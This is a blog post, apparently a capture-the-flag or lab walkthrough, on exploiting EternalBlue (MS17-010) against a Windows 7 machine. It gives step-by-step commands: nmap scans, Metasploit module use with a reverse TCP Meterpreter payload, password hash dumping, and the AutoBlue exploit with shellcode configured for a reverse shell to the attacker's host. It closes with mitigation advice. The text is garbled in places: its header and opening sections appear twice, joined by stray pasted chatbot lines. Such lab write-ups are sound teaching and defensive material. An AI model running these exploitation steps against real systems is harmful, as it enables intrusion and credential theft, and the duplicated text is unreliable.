
---
layout: single
title: "Exploiting EternalBlue (MS17-010): A Walkthrough and Protection Measures"
date: 2024-03-18
author: Nisha McDonnell
excerpt: "A detailed walkthrough of how to exploit the Eternal Blue vulnerability on a Windows 7 Ultimate machine, covering both manual and automated methods."
categories:
  - Blog
  - CTF
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
toc_depth: 3
toc_sticky: true
tags:
  - Penetration Testing
  - Ethical Hacking
  - Cybersecurity
  - Vulnerability Exploitation
tagline: "A detailed walkthrough of how to exploit the Eternal Blue vulnerability on a Windows 7 Ultimate machine, covering both manual and automated methods."
header:
  image: /assets/images/blue-00.png
  caption: "Eternal Blue Exploitation Overview"
  teaser: /assets/images/blue-00.png
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/ctf_hero_header_image.png
  caption: "Photo credit: [**AI**](https://chatgpt.com/)"
  toc: true
---

## Exploiting EternalBlue (MS17-010): A Walkthrough and Protection Measures

## Introduction

In this article, we will explore one of the most notorious vulnerabilities in recent history: **EternalBlue (MS17-010)**. This exploit allows attackers to execute remote code on Windows systems, particularly those running the SMB protocol. We’ll examine the mechanics of the vulnerability, provide a detailed walkthrough of exploiting a Blue machine running Windows 7 Ultimate, and discuss best practices for mitigating the risks associated with this vulnerability.

## Understanding EternalBlue

EternalBlue is an exploit developed by the NSA and leaked by the Shadow Brokers in 2017. It targets a flaw in Microsoft’s implementation of the SMB protocol, specifically versions 1.0, enabling attackers to send specially designed packets to a vulnerable system. This exploit gained notoriety due to its use in the WannaCry ransomware attack, which caused widespread damage across the globe.

### Key Characteristics
- **Vulnerability ID**: MS17-010
- **CVE Identifiers**: 
  - **CVE-2017-0144**: Related to remote code execution through the SMBv1 protocol.
  - **CVE-2017-0145**: Related vulnerability affecting the SMB protocol.
  - **CVE-2017-0146**: Another associated vulnerability.
- **Affected Systems**: Windows 7, Windows Server 2008, and earlier versions with SMB v1 enabled.
- **Impact**: Remote Code Execution, allowing attackers to gain full control of the system.

## Initial Reconnaissance

To assess the target, I performed a comprehensive `nmap` scan on all ports:

```bash
sudo nmap -p- 192.168.17.135 -oN nmap.txt
```
<img src="/assets/images/tcm-academy/blue-01.png">


Subsequent scans provided detailed service information about open ports, particularly noting the SMB service on the Windows 7 Ultimate OS:
```bash
sudo nmap -p- -A -T4 192.168.17.135 -oN nmap.txt
```

<img src="/assets/images/tcm-academy/blue-02.png">





Here’s the blog article properly formatted in Markdown for your Minimal Mistakes Jekyll site on GitHub:

markdown
Copy code
---
layout: single
title: "Exploiting EternalBlue (MS17-010): A Walkthrough and Protection Measures"
date: 2024-03-18
author: Nisha McDonnell
excerpt: "A detailed walkthrough of how to exploit the Eternal Blue vulnerability on a Windows 7 Ultimate machine, covering both manual and automated methods."
categories:
  - Blog
tags:
  - Penetration Testing
  - Cybersecurity
  - Vulnerability Exploitation
tagline: "A comprehensive guide to exploiting the Eternal Blue vulnerability on Windows 7 Ultimate."
header:
  image: /assets/images/letsdefend/webattack-0.png
  caption: "Eternal Blue Exploitation Overview"
  teaser: /assets/images/letsdefend/webattack-0.png
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/ctf_hero_header_image.png
  caption: "Photo credit: [**AI**](https://chatgpt.com/)"
---

## Exploiting EternalBlue (MS17-010): A Walkthrough and Protection Measures

## Introduction

In this article, we will explore one of the most notorious vulnerabilities in recent history: **EternalBlue (MS17-010)**. This exploit allows attackers to execute remote code on Windows systems, particularly those running the SMB protocol. We’ll examine the mechanics of the vulnerability, provide a detailed walkthrough of exploiting a Blue machine running Windows 7 Ultimate, and discuss best practices for mitigating the risks associated with this vulnerability.

## Understanding EternalBlue

EternalBlue is an exploit developed by the NSA and leaked by the Shadow Brokers in 2017. It targets a flaw in Microsoft’s implementation of the SMB protocol, specifically versions 1.0, enabling attackers to send specially designed packets to a vulnerable system. This exploit gained notoriety due to its use in the WannaCry ransomware attack, which caused widespread damage across the globe.

## Key Characteristics
- **Vulnerability ID**: MS17-010
- **CVE Identifiers**: 
  - **CVE-2017-0144**: Related to remote code execution through the SMBv1 protocol.
  - **CVE-2017-0145**: Related vulnerability affecting the SMB protocol.
  - **CVE-2017-0146**: Another associated vulnerability.
- **Affected Systems**: Windows 7, Windows Server 2008, and earlier versions with SMB v1 enabled.
- **Impact**: Remote Code Execution, allowing attackers to gain full control of the system.

## Initial Reconnaissance

To assess the target, I performed a comprehensive `nmap` scan on all ports:

```bash
sudo nmap -p- 192.168.17.135 -oN nmap.txt
```
<img src="/assets/images/tcm-academy/blue-01.png"> 


Subsequent scans provided detailed service information about open ports, particularly noting the SMB service on the Windows 7 Ultimate OS:

```bash
sudo nmap -p- -A -T4 192.168.17.135 -oN nmap.txt
```
<img src="/assets/images/tcm-academy/blue-02.png"> 


## Identifying Exploitation Opportunities

A search for known exploits targeting Windows 7 Ultimate systems yielded useful information for both manual and automated exploitation:

<img src="/assets/images/tcm-academy/blue-03.png"> 

<strong>Automated Exploit via Metasploit:</strong> The Rapid7 site provided an exploit module suitable for our needs, specifically targeting MS17-010.

<ul>
  <li><a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/" target="_blank">MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</a></li>
  <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/" target="_blank">
  <img src="/assets/images/tcm-academy/blue-04.png"> 
  </a>

</ul>

<strong>Local Privilege Escalation: Another exploit could be leveraged for privilege escalation once we gain access to the machine.</strong>
<ul>
  <li><a href="https://www.exploit-db.com/exploits/47176" target="_blank">Microsoft Windows 7 Local Privilege Escalation CVE-2019-1132</a></li>
  <a href="https://www.exploit-db.com/exploits/47176" target="_blank">
  <img src="/assets/images/tcm-academy/blue-05.png"> 
  </a>

</ul>

<strong>Manual Exploit:</strong> A Python-based exploit also met the criteria for the vulnerability.
<ul>
  <li><a href="https://www.exploit-db.com/exploits/42315" target="_blank">EternalBlue SMB Remote Code Execution CVE-2017-0144</a></li>
  <a href="https://www.exploit-db.com/exploits/42315" target="_blank">
  <img src="/assets/images/tcm-academy/blue-06.png"> 
  </a>
</ul>



## Understanding the Vulnerability

To further comprehend MS17-010, I consulted Microsoft's security bulletin, which outlines the vulnerability's impact and mitigation strategies:

<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">Microsoft Security Bulletin MS17-010 - Critical</a>


## Automated Exploitation with Metasploit
I initiated the exploitation process by launching Metasploit and searching for relevant modules:


```bash
msfconsole
search eternalblue
```

<img src="/assets/images/tcm-academy/blue-08.png">

Next, I identified an auxiliary SMB scanner module to verify if the target was vulnerable. I selected option 3 and configured the required settings:
```bash
use 3
options
```

<img src="/assets/images/tcm-academy/blue-09.png">



After running the scan, the results indicated a vulnerability to MS17-010:

```bash
setg RHOSTS 192.168.17.135
run
```
<img src="/assets/images/tcm-academy/blue-10.png">

I then proceeded to find the appropriate exploit module for MS17-010:


```bash
use 0
```

<img src="/assets/images/tcm-academy/blue-11.png">



Before executing the exploit, I verified that all required options were set, ensuring to specify the LHOST IP address of my attacker machine:


```bash
options
```

<img src="/assets/images/tcm-academy/blue-12.png">

To further confirm the target's vulnerability, I executed:


```bash
check
```

<img src="/assets/images/tcm-academy/blue-13.png">


I then set the payload for a 64-bit reverse TCP Meterpreter shell:



```bash
set payload windows/x64/meterpreter/reverse_tcp
run
```

<img src="/assets/images/tcm-academy/blue-14.png">

Upon successful exploitation, I established a Meterpreter session on the target machine:


<img src="/assets/images/tcm-academy/blue-15.png">

## Post-Exploitation: Extracting Password Hashes

With the session active, I executed the hashdump command to retrieve password hashes from the system:

```bash
hashdump
```

This command provided the administrator account's password hash, enabling further actions using tools like Hashcat or John the Ripper to crack the password and gain elevated access.
<img src="/assets/images/tcm-academy/blue-16.png">



## Manual Exploitation


An additional Google search for EternalBlue exploits lead  to the disocvery of this particular exploit that seems easier to achieve our goal:

<ul>

<li><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010 hosted by 3ndG4me</a></li>
</ul>


I cloned this repo to the /opt directory on my Kali machine:

```bash
sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
```

<img src="/assets/images/tcm-academy/blue-17.png">


Next, I implemented the requirements per the directions listed on the repo to meet the Python 3 requirement:

```bash
pip install -r requirements.txt
```

<img src="/assets/images/tcm-academy/blue-18.png">

Running the checker, we see that the target is not patched and, therefore, vulnerable, to this exploit.

```bash
python eternal_checker.py 192.168.17.135
```

<img src="/assets/images/tcm-academy/blue-19.png">


Next, I navigated to the shellcode directory to execute the shell prep script and provided the following inputs for the Eternal Blue Windows Shellcode Compiler:


```bash
cd shellcode
sudo ./shell_prep.sh
192.168.17.134  # LHOST for reverse connection
9999             # LPORT for x64
2222             # LPORT for x86
1                # Type 1 for a regular staged cmd shell
0                # Type 0 for a Meterpreter shell
```

<img src="/assets/images/tcm-academy/blue-20.png">


## Listener Prep

Next, I executed the listener prep script to provide the configuration settings needed to establish a listener in Metasploit that would accept incoming connections from the target machine once the exploit is executed.

```bash
cd ..
sudo ./listener_prep.sh
```

<img src="/assets/images/tcm-academy/blue-21.png">

<img src="/assets/images/tcm-academy/blue-22.png">


## Time to run the exploit:

```bash
python eternalblue_exploit7.py 192.168.17.135 shellcode/sc_all.bin
```


In this case, the exploit crashed the target machine, resulting in the Blue screen:
<img src="/assets/images/tcm-academy/blue-23.png">


## Mitigation Strategies

To protect against the exploitation of EternalBlue, organizations and individuals should implement the following strategies:

<ul>
  <li><strong>Patch Systems: Regularly apply security updates and patches provided by Microsoft. The patch for MS17-010 was released in March 2017; ensure it is installed on all systems. </strong></li>

  <li><strong>Disable SMBv1: As SMBv1 is outdated and insecure, disable it on all systems unless absolutely necessary.</strong></li>

  <li><strong>Network Segmentation: Isolate critical systems from general access. Implement strict firewall rules to limit SMB traffic.</strong></li>

  <li><strong>Intrusion Detection Systems (IDS): Utilize IDS to monitor for suspicious traffic patterns indicative of an EternalBlue exploit attempt.</strong></li>

  <li><strong>Regular Backups: Maintain regular backups of critical data to mitigate the impact of ransomware attacks.</strong></li>
</ul>

The Eternal Blue vulnerability continues to pose significant risks to unpatched systems. Through a combination of effective reconnaissance and exploitation techniques, this walkthrough demonstrates the process of compromising a vulnerable Windows 7 machine. To protect against such vulnerabilities, regular patching, proper configuration, and monitoring are essential.